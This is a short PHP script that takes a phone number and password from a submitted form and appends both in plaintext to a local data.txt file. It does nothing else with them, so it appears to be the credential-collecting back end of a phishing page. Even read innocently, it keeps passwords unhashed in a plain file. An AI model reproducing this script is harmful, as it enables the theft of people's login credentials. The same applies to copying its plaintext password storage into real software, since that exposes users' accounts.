<?php
if(isset($_POST['phone']) && isset($_POST['password'])){
    $phone = $_POST['phone'];
    $password = $_POST['password'];
    
    $data = "Phone number: $phone, Password: $password\n";
    
    file_put_contents('data.txt', $data, FILE_APPEND);
    
    echo "Data has been saved";
} else {
    echo "Error: Phone number or password not provided";
}
?>